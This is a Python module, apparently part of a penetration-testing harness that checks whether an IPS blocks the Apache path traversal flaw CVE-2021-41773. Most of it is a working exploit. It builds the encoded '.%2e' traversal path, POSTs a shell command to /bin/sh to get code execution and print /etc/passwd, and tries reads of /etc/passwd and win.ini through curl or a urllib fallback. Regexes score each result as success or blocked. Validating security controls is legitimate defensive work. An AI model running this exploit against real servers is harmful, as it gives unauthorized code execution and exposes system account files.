"""CVE-2021-41773 — Apache path traversal (mod_cgi normalize-path bug).
Direct HTTP check (curl): request /cgi-bin/.%2e/.. x7 to escape docroot and read
a sensitive file. Tries BOTH a Linux target (/etc/passwd) and a Windows target
(/windows/win.ini) — the vulnerable file differs by OS, and the lab's Apache
container is Linux, so a win.ini-only check 404s against its own lab."""
META = {
    "id": "apache_41773",
    "name": "Apache Path Traversal (CVE-2021-41773)",
    "category": "Server Exploitation",
    "order": 1,  # mid-batch: Server Exploitation pair, right before DNS-over-HTTPS
                 # Bypass, ahead of the run_last ICMP flood/SSH brute tail
    "test_type": "pentest",
    "control": "IPS signature / path normalization",
    "fix": "SD-WAN",
    "cve": "CVE-2021-41773",
    "mitre": ['T1190'],
    "cwe": ['CWE-22'],
    "tactic": 'Initial Access',
    "requires": [],          # curl PREFERRED; pure-stdlib urllib fallback otherwise
    "trips_ips": True,   # path-traversal/RCE signature blacklists the source — run last
    "ports": [("tcp", 80)],
    "port_customizable": True,
    # Linux: /etc/passwd ("root:...:0:0:"); Windows: win.ini ("[fonts]"/"[extensions]")
    "success_regex": r"root:[^:]*:0:0:|\[fonts\]|\[extensions\]",
    # An inline IPS/WAF (e.g. Sangfor's "web Vulnerability" signature) blocks the
    # traversal by RESETTING the connection or returning a block page — curl then
    # reports a reset / empty reply / recv failure, NOT the file. Catch those (and
    # 403/406) so an IPS-blocked run scores BLOCKED instead of NO-RESULT. success
    # is still checked first, so a variant that bypasses and reads the file wins.
    # NOTE: "could not resolve" is NOT here — a DNS resolution failure is the
    # TESTER's own resolver failing to look up the target (a measurement/setup
    # artifact), NOT the target's IPS blocking the traversal, so it must fall to
    # NO-RESULT ("couldn't run — review"), never a false BLOCKED. For an IP target
    # it never arose anyway; for a hostname target it was a mis-attribution.
    "blocked_regex": (
        r"timed out|Connection refused|"
        r"Connection reset|reset by peer|Empty reply from server|Recv failure|"
        r"403 Forbidden|406 Not Acceptable|curl: \((52|56|104)\)"
    ),
}

_ESCAPE = "/cgi-bin/" + "/".join([".%2e"] * 7)
# File-READ variant (works when cgi-bin is a plain readable Alias, or on Windows).
_READ = [("Linux /etc/passwd", _ESCAPE + "/etc/passwd"),
         ("Windows win.ini", _ESCAPE + "/windows/win.ini")]


def _curl_fallback(url, method, data, ctx):
    """urllib traversal probe (curl fallback): returns the response BODY (where the
    success regex finds /etc/passwd or win.ini), or a line the blocked_regex reads
    (403/406/reset/refused/timeout) — path sent AS-IS (urllib doesn't collapse ../)."""
    from modules import _util as U
    code, body, err = U.http_fetch(url, method=method, data=data, ctx=ctx, timeout=10,
                                   follow=False, want_body=True)
    if err:
        low = err.lower()
        if "refused" in low:
            return "Connection refused (%s)" % err
        if "reset" in low:
            return "Connection reset by peer (%s)" % err
        if "timed out" in low or "timeout" in low:
            return "timed out (%s)" % err
        if "resolve" in low or "name or service" in low:
            return "could not resolve (%s)" % err
        return "Empty reply from server (%s)" % err
    head = "403 Forbidden" if code == 403 else ("406 Not Acceptable" if code == 406 else "HTTP %d" % code)
    return "%s\n%s" % (head, body)


def run(target, ctx):
    import shutil
    # -v alongside -s: keep progress silent but re-enable connection diagnostics
    # so a closed/refused port surfaces "Connection refused" (blocked_regex)
    # instead of empty output.
    port = ctx.get_port("apache_41773", 80)   # overridable per-attack (GUI/env)
    have_curl = shutil.which("curl") is not None
    out = [] if have_curl else ["# (python urllib fallback — curl not installed)"]

    # RCE variant FIRST: when cgi-bin is a ScriptAlias + mod_cgi (the common 41773
    # setup, incl. this lab's container), the traversal EXECUTES the target — so a
    # file read via the alias returns 500 (exec attempt), not content. The canonical
    # confirmation is to traverse to /bin/sh and run `cat /etc/passwd`. Benign read,
    # but it IS code-exec: gated behind the harness RoE like every module.
    out.append("--- traversal -> RCE (cgi-bin ScriptAlias): cat /etc/passwd ---")
    rce_url = f"http://{target}:{port}{_ESCAPE}/bin/sh"
    rce_body = "echo Content-Type: text/plain; echo; cat /etc/passwd"
    if have_curl:
        # -S alongside -s: a silent run still surfaces the error line (e.g. an IPS
        # connection reset) instead of empty output that would read as NO-RESULT.
        out.append(ctx.run_cmd(
            f'curl -s -S --path-as-is -m10 -d "{rce_body}" "{rce_url}"', target))
    else:
        out.append(_curl_fallback(rce_url, "POST", rce_body, ctx))

    # File-READ fallback (plain readable Alias / Windows target)
    for label, path in _READ:
        out.append(f"--- traversal -> read {label} ---")
        url = f"http://{target}:{port}{path}"
        if have_curl:
            out.append(ctx.run_cmd(f'curl -s -v --path-as-is -m10 "{url}"', target))
        else:
            out.append(_curl_fallback(url, "GET", None, ctx))
    return "\n".join(out)
